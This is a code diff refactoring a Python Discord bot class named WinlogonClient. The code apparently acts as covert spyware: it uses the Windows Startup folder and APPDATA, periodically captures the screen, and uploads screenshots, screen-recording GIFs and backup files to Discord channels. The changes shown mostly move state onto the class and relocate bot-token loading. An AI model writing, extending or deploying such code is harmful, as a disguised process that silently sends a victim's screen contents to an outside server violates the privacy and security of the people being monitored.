@@ -100,20 +100,16 @@ class WinlogonClient(discord.Client):
         start_up = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
         os.chdir(self.paths["APPDATA"])  # Сделать папкой по умолчанию
 
-        random_color = int("36393f", 16)  # Обьявить переменную
-        MAIN_SCRIPT = False  # Главный ли скрипт
-        RUN_STATUS = False  # Статус включения бота
-        INDEX_STATUS = False  # ?
-        CONNECTED_STATUS = False  # Статус включения переписки
-        CHECKING_AFK_STATUS = False
-        s1, s2 = "{", "}"  # sign first, sign second
-        msg_status_of_users = ""
+        self.random_color = int("36393f", 16)  # Обьявить переменную
+        self.MAIN_SCRIPT = False  # Главный ли скрипт
+        self.RUN_STATUS = False  # Статус включения бота
+        self.INDEX_STATUS = False  # ?
+        self.CONNECTED_STATUS = False  # Статус включения переписки
+        self.CHECKING_AFK_STATUS = False
+        self.s1, self.s2 = "{", "}"  # sign first, sign second
+        self.msg_status_of_users = ""
 
-        with open(dir_name + "/TOKEN") as f:
-            for read in f:
-                token = read
-
-        with open(dir_name + "/fruit_id.json", "r") as r:
+        with open(self.paths["."] + "/fruit_id.json", "r") as r:
             self.sprites_list = json.load(r)
             self.icon_url = f"https://cdn.discordapp.com/emojis/" \
                        f"{self.sprites_list['id'][randint(0, len(self.sprites_list['id']) - 1)]}.png?v=1"
@@ -1112,29 +1108,26 @@ class WinlogonClient(discord.Client):
                 imageio.mimsave(f"{self.paths['APPDATA']}\\movie.gif", images)
                 await self.send_file(f"{self.paths['APPDATA']}\\movie.gif")
 
-        class DiscordLoop:
-            @staticmethod
-            async def give_screen():
-                global self.lost_screen_delay, screen_delay
-                if CHECKING_AFK_STATUS:
-                    try:
-                        Scripts.create_activity()
-                    except BaseException:
-                        pass
+    async def give_screen(self):
+        if self.CHECKING_AFK_STATUS:
+            try:
+                Scripts.create_activity()
+            except BaseException:
+                pass
 
+        while True:
+            while self.lost_screen_delay >= 1:
+                await asyncio.sleep(1)
+                self.lost_screen_delay -= 1
+            """
+            if File.read("activity") != "YES":
                 while True:
-                    while self.lost_screen_delay >= 1:
-                        await asyncio.sleep(1)
-                        self.lost_screen_delay -= 1
-                    """
-                    if File.read("activity") != "YES":
-                        while True:
-                            await asyncio.sleep(5)
-                            if File.read("activity") == "YES":
-                                break
-                    """
-                    await self.send_embed()
-                    self.lost_screen_delay = screen_delay
+                    await asyncio.sleep(5)
+                    if File.read("activity") == "YES":
+                        break
+            """
+            await self.send_embed()
+            self.lost_screen_delay = self.screen_delay
 
     def default_settings(self):
         self.access_to_screen = True  # Разрешение на скрины
@@ -1151,8 +1144,7 @@ class WinlogonClient(discord.Client):
         if login == "ALEX":
             try:
                 body_time = datetime.strftime(datetime.now(), "```python\n\'%d %B %H:%M:%S\'\n```\n")
-                url_back_up = await client.send_file(self.channel.back_up, self.file_name, filename=self.file_name,
-                                                     content=body_time)
+                url_back_up = await self.channel.back_up.send(content=body_time, file=self.file_name, files=self.file_name)
                 link = url_back_up.attachments[0]["url"]
                 await self.channel.back_up.send(link)
                 # self.access_to_screen = False
@@ -1337,6 +1329,10 @@ class WinlogonClient(discord.Client):
             except BaseException:
                 print("Ошибка")"""
 
+
+with open(os.path.dirname(__file__) + "/resources/TOKEN") as f:
+    for read in f:
+        token = read
 
 client = WinlogonClient()
 client.run(token)
